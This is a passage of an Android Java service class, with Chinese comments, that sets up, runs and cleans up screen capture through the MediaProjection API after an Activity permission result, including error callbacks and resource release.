                        callback.onError(e.getMessage());
                    } finally {
                        if (image != null) image.close();
                        reader.close();
                        vd.release();
                    }
                }
            }, mediaProjectionHandler);

        } catch (Exception e) {
            Log.e(TAG, "MediaProjection capture failed", e);
            callback.onError(e.getMessage());
        }
    }

    /**
     * 初始化 MediaProjection — 从 Activity 授权结果调用
     */
    public void initMediaProjection(int resultCode, Intent data) {
        cleanupMediaProjection();

        MediaProjectionManager mpm = (MediaProjectionManager)
            getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm == null) {
            Log.e(TAG, "MediaProjectionManager not available");
            return;
        }

        mediaProjection = mpm.getMediaProjection(resultCode, data);
        if (mediaProjection == null) {
            Log.e(TAG, "Failed to create MediaProjection");
            return;
        }

        mediaProjectionThread = new HandlerThread("MediaProjection");
        mediaProjectionThread.start();
        mediaProjectionHandler = new Handler(mediaProjectionThread.getLooper());

        Log.i(TAG, "MediaProjection initialized successfully");
    }

    /**
     * 清理 MediaProjection 资源
     */
    private void cleanupMediaProjection() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (mediaProjectionThread != null) {
            mediaProjectionThread.quitSafely();
            mediaProjectionThread = null;
            mediaProjectionHandler = null;
        }
    }
}
